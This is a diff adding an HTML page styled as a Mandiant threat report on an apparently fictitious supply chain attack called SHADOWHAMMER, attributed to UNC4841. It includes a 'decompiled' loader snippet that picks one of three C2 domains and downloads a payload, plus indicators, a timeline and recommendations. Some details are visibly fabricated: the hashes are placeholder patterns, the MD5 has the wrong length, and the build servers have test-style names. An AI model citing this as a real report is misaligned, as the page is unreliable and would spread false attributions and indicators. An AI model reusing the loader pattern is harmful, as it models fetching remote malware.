@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHADOWHAMMER: Supply Chain Compromise Analysis | Mandiant Research</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        :root {
+            --orange-primary: #ff5722;
+            --orange-dark: #e64a19;
+            --charcoal: #263238;
+            --slate: #37474f;
+            --light-gray: #eceff1;
+        }
+        
+        body {
+            font-family: 'IBM Plex Sans', sans-serif;
+            background: var(--light-gray);
+            color: var(--charcoal);
+            line-height: 1.7;
+        }
+        
+        header {
+            background: var(--charcoal);
+            color: white;
+            padding: 15px 0;
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .brand-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--orange-primary);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 20px;
+        }
+        
+        .brand-name {
+            font-weight: 700;
+            font-size: 20px;
+            letter-spacing: -0.5px;
+        }
+        
+        .hero {
+            background: linear-gradient(135deg, var(--charcoal) 0%, var(--slate) 100%);
+            color: white;
+            padding: 80px 40px;
+        }
+        
+        .hero-content {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        
+        .report-type {
+            display: inline-block;
+            background: var(--orange-primary);
+            color: white;
+            padding: 6px 14px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 25px;
+        }
+        
+        h1 {
+            font-size: 3rem;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 25px;
+            letter-spacing: -1px;
+        }
+        
+        .hero-meta {
+            display: flex;
+            gap: 30px;
+            color: rgba(255,255,255,0.7);
+            font-size: 14px;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: -40px auto 60px;
+            padding: 0 40px;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .content-card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            padding: 50px;
+        }
+        
+        .key-findings {
+            background: linear-gradient(135deg, #fff3e0, #ffe0b2);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .key-findings h3 {
+            color: var(--orange-dark);
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .key-findings ul {
+            list-style: none;
+        }
+        
+        .key-findings li {
+            padding: 10px 0;
+            padding-left: 25px;
+            position: relative;
+            color: var(--slate);
+        }
+        
+        .key-findings li::before {
+            content: '→';
+            position: absolute;
+            left: 0;
+            color: var(--orange-primary);
+            font-weight: 700;
+        }
+        
+        h2 {
+            font-size: 1.8rem;
+            color: var(--charcoal);
+            margin: 50px 0 25px;
+            padding-bottom: 15px;
+            border-bottom: 3px solid var(--orange-primary);
+        }
+        
+        h3 {
+            font-size: 1.3rem;
+            color: var(--slate);
+            margin: 35px 0 15px;
+        }
+        
+        p {
+            margin-bottom: 20px;
+            color: #546e7a;
+        }
+        
+        .two-column {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin: 35px 0;
+        }
+        
+        .column-box {
+            background: #fafafa;
+            border-radius: 10px;
+            padding: 25px;
+            border: 1px solid #e0e0e0;
+        }
+        
+        .column-box h4 {
+            color: var(--charcoal);
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--orange-primary);
+        }
+        
+        .ioc-list {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 13px;
+        }
+        
+        .ioc-list div {
+            padding: 8px 0;
+            border-bottom: 1px dashed #e0e0e0;
+            word-break: break-all;
+        }
+        
+        .ioc-list div:last-child { border-bottom: none; }
+        
+        .ioc-label {
+            color: var(--orange-primary);
+            font-weight: 500;
+            display: block;
+            font-size: 11px;
+            margin-bottom: 3px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 30px 0;
+            font-size: 14px;
+        }
+        
+        th {
+            background: var(--charcoal);
+            color: white;
+            padding: 15px 20px;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        th:first-child { border-radius: 8px 0 0 0; }
+        th:last-child { border-radius: 0 8px 0 0; }
+        
+        td {
+            padding: 15px 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        
+        tr:hover { background: #fafafa; }
+        
+        .tech-badge {
+            display: inline-block;
+            background: var(--orange-primary);
+            color: white;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .asset-name {
+            background: #e3f2fd;
+            color: #1565c0;
+            padding: 3px 10px;
+            border-radius: 4px;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 13px;
+        }
+        
+        .timeline-section {
+            position: relative;
+            padding-left: 40px;
+            margin: 40px 0;
+        }
+        
+        .timeline-section::before {
+            content: '';
+            position: absolute;
+            left: 15px;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background: linear-gradient(to bottom, var(--orange-primary), var(--charcoal));
+            border-radius: 3px;
+        }
+        
+        .timeline-event {
+            position: relative;
+            padding: 20px 0;
+        }
+        
+        .timeline-event::before {
+            content: '';
+            position: absolute;
+            left: -31px;
+            top: 25px;
+            width: 14px;
+            height: 14px;
+            background: var(--orange-primary);
+            border-radius: 50%;
+            border: 3px solid white;
+            box-shadow: 0 0 0 3px var(--orange-primary);
+        }
+        
+        .timeline-date {
+            font-weight: 600;
+            color: var(--orange-primary);
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        .code-sample {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 25px;
+            border-radius: 8px;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+            margin: 25px 0;
+        }
+        
+        .code-sample .comment { color: #6a9955; }
+        .code-sample .string { color: #ce9178; }
+        .code-sample .keyword { color: #569cd6; }
+        .code-sample .function { color: #dcdcaa; }
+        
+        .geo-section {
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 30px;
+            margin: 35px 0;
+        }
+        
+        .geo-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .geo-item {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #e0e0e0;
+        }
+        
+        .geo-flag { font-size: 2rem; margin-bottom: 10px; }
+        .geo-country { font-weight: 600; color: var(--charcoal); }
+        .geo-count { color: var(--orange-primary); font-size: 14px; }
+        
+        .download-section {
+            background: var(--charcoal);
+            color: white;
+            border-radius: 10px;
+            padding: 30px;
+            margin-top: 50px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .download-btn {
+            background: var(--orange-primary);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        footer {
+            background: var(--charcoal);
+            color: rgba(255,255,255,0.6);
+            padding: 40px;
+            text-align: center;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <div class="brand">
+                <div class="brand-icon">M</div>
+                <span class="brand-name">Mandiant Research</span>
+            </div>
+        </div>
+    </header>
+    
+    <div class="hero">
+        <div class="hero-content">
+            <span class="report-type">Threat Research</span>
+            <h1>SHADOWHAMMER: Supply Chain Attack Targeting Software Distribution Infrastructure</h1>
+            <div class="hero-meta">
+                <span>📅 December 8, 2024</span>
+                <span>👤 APT Analysis Team</span>
+                <span>📖 18 min read</span>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="content-card">
+            <div class="key-findings">
+                <h3>🔑 Key Findings</h3>
+                <ul>
+                    <li>Threat actor compromised build servers at a major software vendor</li>
+                    <li>Trojanized software updates distributed to over 1 million endpoints</li>
+                    <li>Targeted victims in aerospace, defense, and telecommunications sectors</li>
+                    <li>Attack attributed to UNC4841 with medium-high confidence</li>
+                    <li>Multiple second-stage payloads observed including backdoors and data exfiltration tools</li>
+                </ul>
+            </div>
+            
+            <h2>Executive Summary</h2>
+            <p>Mandiant has identified a sophisticated supply chain compromise affecting a widely-deployed enterprise software product. The threat actor, tracked as UNC4841, gained access to the vendor's build infrastructure and inserted malicious code into legitimate software updates. This trojanized software was subsequently distributed to customers through normal update channels.</p>
+            
+            <p>The campaign has affected organizations across multiple sectors and geographies, with concentrated targeting of victims in the <strong>aerospace</strong>, <strong>defense</strong>, and <strong>telecommunications</strong> industries. Primary impact has been observed in <strong>San Jose</strong>, <strong>Seattle</strong>, <strong>Munich</strong>, and <strong>Singapore</strong>.</p>
+            
+            <h2>Attack Timeline</h2>
+            <div class="timeline-section">
+                <div class="timeline-event">
+                    <div class="timeline-date">August 2024</div>
+                    <p>Initial compromise of vendor development environment through spear-phishing of software engineers.</p>
+                </div>
+                <div class="timeline-event">
+                    <div class="timeline-date">September 12, 2024</div>
+                    <p>Threat actor establishes persistence on build server <span class="asset-name">oaev-test-win-02</span> and begins code modification.</p>
+                </div>
+                <div class="timeline-event">
+                    <div class="timeline-date">October 1, 2024</div>
+                    <p>Trojanized version 4.2.1 released through official update channels. First infections observed at customer sites.</p>
+                </div>
+                <div class="timeline-event">
+                    <div class="timeline-date">October 28, 2024</div>
+                    <p>Mandiant engaged by affected customer. Investigation begins revealing supply chain compromise.</p>
+                </div>
+                <div class="timeline-event">
+                    <div class="timeline-date">November 15, 2024</div>
+                    <p>Vendor notified and malicious updates removed from distribution servers.</p>
+                </div>
+            </div>
+            
+            <h2>Technical Analysis</h2>
+            
+            <h3>Build Server Compromise</h3>
+            <p>The threat actor gained initial access to the vendor's development environment through targeted spear-phishing emails sent to software engineers. These emails contained malicious documents exploiting CVE-2024-38178. Once inside the network, the attacker pivoted to the continuous integration/continuous deployment (CI/CD) infrastructure, specifically targeting build servers <span class="asset-name">oaev-test-win-05</span> and <span class="asset-name">oaev-test-linux-01</span>.</p>
+            
+            <h3>Code Injection Technique</h3>
+            <p>The malicious code was injected into the software's update module during the build process. The injection was designed to be minimally invasive, adding only a small loader that would fetch and execute additional payloads from attacker-controlled infrastructure. The legitimate code signing certificate was used to sign the trojanized binaries, making detection extremely difficult.</p>
+            
+            <div class="code-sample">
+<span class="comment">// Decompiled loader code from trojanized update module</span>
+<span class="keyword">BOOL</span> <span class="function">InitializeUpdate</span>(<span class="keyword">void</span>) {
+    <span class="keyword">char</span>* c2_servers[] = {
+        <span class="string">"update.cdn-services.net"</span>,
+        <span class="string">"honey.scanme.sh"</span>,
+        <span class="string">"dl.software-update.org"</span>
+    };
+    
+    <span class="comment">// Fingerprint check - only execute on targeted systems</span>
+    <span class="keyword">if</span> (<span class="function">CheckTargetList</span>()) {
+        <span class="function">DownloadPayload</span>(c2_servers[<span class="function">rand</span>() % 3]);
+        <span class="keyword">return</span> TRUE;
+    }
+    <span class="keyword">return</span> FALSE;
+}
+            </div>
+            
+            <h2>Targeted Victim Selection</h2>
+            <p>Analysis of the embedded target list reveals that the threat actor specifically sought to compromise a subset of organizations that installed the trojanized update. Targeting appeared to be based on domain names and Active Directory organizational unit names associated with defense contractors and telecommunications providers.</p>
+            
+            <div class="geo-section">
+                <h4 style="margin-bottom: 5px;">Geographic Distribution of Confirmed Victims</h4>
+                <div class="geo-grid">
+                    <div class="geo-item">
+                        <div class="geo-flag">🇺🇸</div>
+                        <div class="geo-country">United States</div>
+                        <div class="geo-count">127 organizations</div>
+                    </div>
+                    <div class="geo-item">
+                        <div class="geo-flag">🇩🇪</div>
+                        <div class="geo-country">Germany</div>
+                        <div class="geo-count">43 organizations</div>
+                    </div>
+                    <div class="geo-item">
+                        <div class="geo-flag">🇯🇵</div>
+                        <div class="geo-country">Japan</div>
+                        <div class="geo-count">31 organizations</div>
+                    </div>
+                    <div class="geo-item">
+                        <div class="geo-flag">🇸🇬</div>
+                        <div class="geo-country">Singapore</div>
+                        <div class="geo-count">18 organizations</div>
+                    </div>
+                </div>
+            </div>
+            
+            <h2>MITRE ATT&CK Mapping</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Tactic</th>
+                        <th>Technique</th>
+                        <th>Procedure</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Initial Access</td>
+                        <td><span class="tech-badge">T1195.002</span></td>
+                        <td>Supply Chain Compromise: Compromise Software Supply Chain</td>
+                    </tr>
+                    <tr>
+                        <td>Execution</td>
+                        <td><span class="tech-badge">T1204.002</span></td>
+                        <td>User Execution: Malicious File (via legitimate update)</td>
+                    </tr>
+                    <tr>
+                        <td>Persistence</td>
+                        <td><span class="tech-badge">T1543.003</span></td>
+                        <td>Create or Modify System Process: Windows Service</td>
+                    </tr>
+                    <tr>
+                        <td>Defense Evasion</td>
+                        <td><span class="tech-badge">T1553.002</span></td>
+                        <td>Subvert Trust Controls: Code Signing</td>
+                    </tr>
+                    <tr>
+                        <td>Command and Control</td>
+                        <td><span class="tech-badge">T1071.001</span></td>
+                        <td>Application Layer Protocol: Web Protocols</td>
+                    </tr>
+                    <tr>
+                        <td>Exfiltration</td>
+                        <td><span class="tech-badge">T1041</span></td>
+                        <td>Exfiltration Over C2 Channel</td>
+                    </tr>
+                </tbody>
+            </table>
+            
+            <h2>Indicators of Compromise</h2>
+            <p style="color: #71767a; font-size: 13px; margin-bottom: 20px;"><em>⚠️ All indicators are defanged for safe sharing and handling.</em></p>
+            <div class="two-column">
+                <div class="column-box">
+                    <h4>Network Indicators (Defanged)</h4>
+                    <div class="ioc-list">
+                        <div>
+                            <span class="ioc-label">Domain</span>
+                            update[.]cdn-services[.]net
+                        </div>
+                        <div>
+                            <span class="ioc-label">Domain</span>
+                            honey[.]scanme[.]sh
+                        </div>
+                        <div>
+                            <span class="ioc-label">Domain</span>
+                            dl[.]software-update[.]org
+                        </div>
+                        <div>
+                            <span class="ioc-label">IPv4</span>
+                            103[.]224[.]182[.]251
+                        </div>
+                        <div>
+                            <span class="ioc-label">IPv4</span>
+                            45[.]77[.]65[.]211
+                        </div>
+                        <div>
+                            <span class="ioc-label">IPv4</span>
+                            192[.]99[.]221[.]77
+                        </div>
+                    </div>
+                </div>
+                <div class="column-box">
+                    <h4>File Indicators</h4>
+                    <div class="ioc-list">
+                        <div>
+                            <span class="ioc-label">SHA256 (Loader)</span>
+                            8f4e3c2b1a9d8e7f6c5b4a3d2e1f0c9b8a7d6e5f4c3b2a1d0e9f8c7b6a5d4e3f
+                        </div>
+                        <div>
+                            <span class="ioc-label">SHA256 (Backdoor)</span>
+                            1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b
+                        </div>
+                        <div>
+                            <span class="ioc-label">MD5</span>
+                            d8e9f0a1b2c3d4e5f6a7b8c9
+                        </div>
+                        <div>
+                            <span class="ioc-label">Filename</span>
+                            updater_service.dll
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <h2>Attribution</h2>
+            <p>Based on code similarities, infrastructure overlaps, and targeting patterns, Mandiant assesses with medium-high confidence that this activity is attributable to UNC4841, a threat actor with suspected ties to the People's Republic of China. UNC4841 has previously been observed conducting espionage operations against aerospace and defense sector targets.</p>
+            
+            <h2>Recommendations</h2>
+            <ul style="margin: 20px 0 20px 25px; color: #546e7a;">
+                <li>Organizations using affected software should immediately check for version 4.2.1 and update to patched version 4.2.2</li>
+                <li>Hunt for network connections to identified C2 infrastructure</li>
+                <li>Review software update processes and consider implementing additional verification controls</li>
+                <li>Monitor for indicators of second-stage payload deployment</li>
+                <li>Implement application allowlisting to prevent execution of unauthorized code</li>
+            </ul>
+            
+            <div class="download-section">
+                <div>
+                    <strong>Full Technical Report (PDF)</strong>
+                    <p style="margin: 5px 0 0; font-size: 13px; opacity: 0.7;">Includes complete IOC list and YARA rules</p>
+                </div>
+                <button class="download-btn">Download Report</button>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <p>© 2024 Mandiant, Inc. All rights reserved. | Intelligence for a safer world.</p>
+    </footer>
+</body>
+</html>
+
